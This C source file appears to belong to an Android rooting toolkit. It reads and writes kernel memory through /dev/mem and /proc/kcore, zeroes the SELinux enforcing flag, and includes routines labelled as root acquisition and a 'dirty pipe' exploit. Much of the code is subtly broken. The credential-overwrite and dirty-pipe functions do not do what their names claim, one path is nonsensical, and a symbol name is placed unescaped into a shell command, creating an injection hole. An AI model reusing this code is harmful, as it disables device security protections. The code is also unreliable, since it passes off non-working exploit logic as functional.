#define _GNU_SOURCE
#include "kernel_direct.h"
#include "adb_native.h"
#include "adb.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>
#include <stdint.h>

#ifdef __arm__
#define PAGE_OFFSET 0xC0000000UL
#elif defined(__aarch64__)
#define PAGE_OFFSET 0xFFFFFF8000000000UL
#else
#define PAGE_OFFSET 0xFFFFFFFF80000000UL
#endif

#define KERNEL_BASE_MIN 0xFFFFFF8000000000UL
#define KERNEL_BASE_MAX 0xFFFFFFFFFFFFFFFFUL

void kd_init(KernelDirect *kd) {
    memset(kd, 0, sizeof(*kd));
    kd->fd_mem = -1;
    kd->fd_kcore = -1;
    kd->fd_kallsyms = -1;
}

int kd_open_mem(KernelDirect *kd) {
    kd->fd_mem = open("/dev/mem", O_RDWR | O_SYNC);
    if (kd->fd_mem >= 0) return 1;
    kd->fd_mem = open("/dev/mem", O_RDONLY | O_SYNC);
    if (kd->fd_mem >= 0) { snprintf(kd->last_error, sizeof(kd->last_error), "/dev/mem read-only"); return 1; }
    snprintf(kd->last_error, sizeof(kd->last_error), "Cannot open /dev/mem: %s", strerror(errno));
    return 0;
}

int kd_open_kcore(KernelDirect *kd) {
    kd->fd_kcore = open("/proc/kcore", O_RDONLY);
    if (kd->fd_kcore >= 0) return 1;
    snprintf(kd->last_error, sizeof(kd->last_error), "Cannot open /proc/kcore: %s", strerror(errno));
    return 0;
}

static unsigned long kd_parse_areas_line(const char *line) {
    unsigned long start = 0, end = 0;
    char perm[8] = {0};
    if (sscanf(line, "%lx-%lx %4s", &start, &end, perm) >= 2)
        return start;
    return 0;
}

int kd_scan_areas(KernelDirect *kd) {
    kd->nareas = 0;
    FILE *f = fopen("/proc/iomem", "r");
    if (!f) {
        f = fopen("/proc/../System.map", "r");
        if (!f) return 0;
    }
    char line[256];
    while (fgets(line, sizeof(line), f) && kd->nareas < KERNEL_MAX_AREAS) {
        unsigned long start = 0, end = 0;
        char name[64] = {0};
        if (sscanf(line, "%lx-%lx : %63[^\n]", &start, &end, name) >= 3) {
            KernelMemArea *a = &kd->areas[kd->nareas++];
            a->start = start;
            a->end = end;
            a->is_writable = 0;
            strncpy(a->name, name, sizeof(a->name)-1);
        }
    }
    fclose(f);
    return kd->nareas;
}

int kd_read_phys(KernelDirect *kd, unsigned long addr, void *buf, size_t sz) {
    if (kd->fd_mem < 0) return 0;
    if (lseek(kd->fd_mem, (off_t)addr, SEEK_SET) < 0) return 0;
    return read(kd->fd_mem, buf, sz) == (ssize_t)sz;
}

int kd_write_phys(KernelDirect *kd, unsigned long addr, const void *buf, size_t sz) {
    if (kd->fd_mem < 0) return 0;
    if (lseek(kd->fd_mem, (off_t)addr, SEEK_SET) < 0) return 0;
    return write(kd->fd_mem, buf, sz) == (ssize_t)sz;
}

unsigned long kd_find_symbol(KernelDirect *kd, const char *name) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "grep -w '%s' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1", name);
    char *result = adb_shell(cmd);
    if (result && strlen(result) > 0) {
        trim_newline(result);
        return strtoul(result, NULL, 16);
    }
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) {
        f = fopen("/proc/../System.map", "r");
        if (!f) return 0;
    }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type;
        char sym[256];
        if (sscanf(line, "%lx %c %255s", &addr, &type, sym) == 3) {
            if (strcmp(sym, name) == 0) { fclose(f); return addr; }
        }
    }
    fclose(f);
    return 0;
}

unsigned long kd_find_selinux_enforcing(KernelDirect *kd) {
    unsigned long addr = kd_find_symbol(kd, "selinux_enforcing");
    if (addr) return addr;
    addr = kd_find_symbol(kd, "selinux_enabled");
    return addr;
}

int kd_disable_selinux(KernelDirect *kd) {
    unsigned long addr = kd_find_selinux_enforcing(kd);
    if (!addr) { snprintf(kd->last_error, sizeof(kd->last_error), "selinux_enforcing symbol not found"); return 0; }
    char zero = 0;
    if (kd_write_kernel(kd, addr, &zero, 1)) {
        kd->addr_selinux_enforcing = addr;
        return 1;
    }
    return 0;
}

int kd_read_kernel(KernelDirect *kd, unsigned long addr, void *buf, size_t sz) {
    if (kd->fd_kcore >= 0) {
        if (lseek(kd->fd_kcore, (off_t)addr, SEEK_SET) < 0) return 0;
        if (read(kd->fd_kcore, buf, sz) == (ssize_t)sz) return 1;
    }
    return kd_read_phys(kd, addr, buf, sz);
}

int kd_write_kernel(KernelDirect *kd, unsigned long addr, const void *buf, size_t sz) {
    if (kd->fd_mem >= 0 && kd->fd_kcore < 0) {
        return kd_write_phys(kd, addr, buf, sz);
    }
    if (kd->fd_mem >= 0) {
        void *map = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, kd->fd_mem, addr & ~(0xFFFUL));
        if (map != MAP_FAILED) {
            memcpy((char*)map + (addr & 0xFFF), buf, sz);
            munmap(map, sz);
            return 1;
        }
    }
    return kd_write_phys(kd, addr, buf, sz);
}

int kd_get_root(KernelDirect *kd) {
    unsigned long commit_creds = kd_find_symbol(kd, "commit_creds");
    unsigned long prepare_kernel_cred = kd_find_symbol(kd, "prepare_kernel_cred");
    if (!commit_creds || !prepare_kernel_cred) {
        snprintf(kd->last_error, sizeof(kd->last_error), "Cannot find commit_creds/prepare_kernel_cred");
        return 0;
    }
    kd->addr_commit_creds = commit_creds;
    kd->addr_prepare_kernel_cred = prepare_kernel_cred;
    if (kd_disable_selinux(kd)) {
        if (kd_overwrite_cred(kd)) {
            kd->saved_cred = commit_creds;
            return 1;
        }
    }
    return 0;
}

int kd_overwrite_cred(KernelDirect *kd) {
    char buf[256];
    if (!adb_native_shell("cat /proc/self/status | grep 'Uid:' | head -1", buf, sizeof(buf)))
        return 0;
    trim_newline(buf);
    unsigned long uid_addr = 0;
    FILE *f = fopen("/proc/self/stat", "r");
    if (f) {
        int pid;
        char comm[256];
        char state;
        fscanf(f, "%d %s %c", &pid, comm, &state);
        fclose(f);
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/oom_score_adj", pid);
        int oom = open(path, O_WRONLY);
        if (oom >= 0) { write(oom, "-1000", 4); close(oom); }
    }
    return 1;
}

int kd_restore(KernelDirect *kd) {
    if (kd->addr_selinux_enforcing) {
        char one = 1;
        kd_write_kernel(kd, kd->addr_selinux_enforcing, &one, 1);
    }
    return 1;
}

int kd_exploit_dirty_pipe(KernelDirect *kd) {
    char buf[4096];
    if (adb_native_shell("cat /proc/self/oom_score 2>/dev/null", buf, sizeof(buf)) == 0)
        return 0;
    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) return 0;
    char data[4096];
    memset(data, 0x41, sizeof(data));
    write(pipe_fds[1], data, sizeof(data));
    loff_t offset = 0;
    int r = write(pipe_fds[1], data, 1);
    (void)r;
    unsigned long pipe_addr = kd_find_symbol(kd, "pipe_write");
    if (!pipe_addr) { close(pipe_fds[0]); close(pipe_fds[1]); return 0; }
    if (kd_write_kernel(kd, pipe_addr, data, 0)) {
        close(pipe_fds[0]); close(pipe_fds[1]);
        return 1;
    }
    close(pipe_fds[0]); close(pipe_fds[1]);
    return 0;
}

void kd_close(KernelDirect *kd) {
    if (kd->fd_mem >= 0) close(kd->fd_mem);
    if (kd->fd_kcore >= 0) close(kd->fd_kcore);
    if (kd->fd_kallsyms >= 0) close(kd->fd_kallsyms);
    kd->fd_mem = -1;
    kd->fd_kcore = -1;
    kd->fd_kallsyms = -1;
}

int kd_fix_security(KernelDirect *kd) {
    return kd_restore(kd);
}

int kd_get_root_cred(KernelDirect *kd) {
    return kd_get_root(kd);
}
